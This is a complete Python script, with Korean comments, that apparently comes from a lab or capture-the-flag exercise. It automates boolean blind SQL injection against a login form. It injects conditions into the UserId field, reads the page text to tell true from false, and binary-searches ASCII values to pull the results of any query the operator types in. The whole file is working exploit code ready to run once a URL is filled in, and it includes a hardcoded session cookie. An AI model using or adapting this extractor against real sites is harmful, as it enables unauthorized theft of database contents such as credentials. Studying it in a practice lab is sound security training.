# 최종 완성 코드
import urllib.request
import urllib.parse
import time
import re

def blindSqli(query):
	while True:
		try:
			# 본인 실습 시스템의 URL 경로를 입력하세요!
			url = ""

			param = "' and {} and '1'='1".format(query)

			data = {'UserId': 'mario'+param,'Password':'mariosuper','Submit':'Login'}
			data = urllib.parse.urlencode(data).encode()
			cookie = 'PHPSESSID=nn91fov2c3j46bbaa9mb88qdft;'
			req = urllib.request.Request(url, data=data)
			
			req.add_header('cookie',cookie)
			req.add_header('User-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36')

			response = urllib.request.urlopen(req)
			res_text = response.read().decode()

			true_chk = re.findall('User Name : mario', res_text)
			false_chk = re.findall('Incorrect information', res_text)
			response.close()
			if(true_chk):
				return True
			elif(false_chk):
				return False
			else:
				continue
		except ConnectionResetError:
			print("Connection Error! Wait...!")
			time.sleep(10)
			input("Would you continue?")
			continue


def check_length(sql_query):

	for i in range(1,50):
		query = "length((" + sql_query + ")) = " + str(i)
		res = blindSqli(query)

		if(res):
			return i

	return 0

def cmp_bigger(i,j,sql):
	query = "(ascii(substring(("+sql+"),"+ str(i)+",1))) > " + str(j)
	#print(query)
	res = blindSqli(query)

	return res	

def cmp_same(i,j,sql):

	query = "(ascii(substring(("+sql+"),"+ str(i)+",1))) = " + str(j)
	res = blindSqli(query)

	return res

print("SQL Injection Data 추출 프로그램.")
sql_query = input("SQL > ")

#sql_query = "select flag from flag_table limit 0,1"
data_len = check_length(sql_query)

extracted_data = ""
print("Extract Data Len : " + str(data_len))

for i in range(1,data_len+1):
	start_idx = 33
	end_idx = 127
	mid_idx = 60

	while(True):
		print("Extracted Data : " + extracted_data + chr(mid_idx), end="\r")
		if((start_idx >= mid_idx) or (mid_idx > end_idx)):
			if(cmp_same(i,end_idx, sql_query)):
				print("Extracted Data : " + extracted_data, end="\r")
				extracted_data += chr(end_idx)
				break

		cmp_res = cmp_bigger(i, mid_idx, sql_query)

		if(cmp_res == True):
			start_idx = mid_idx
			mid_idx = int((mid_idx + end_idx) / 2)
		else:
			end_idx = mid_idx
			mid_idx = int((start_idx + mid_idx) / 2)

print("Extracted Data : " + extracted_data)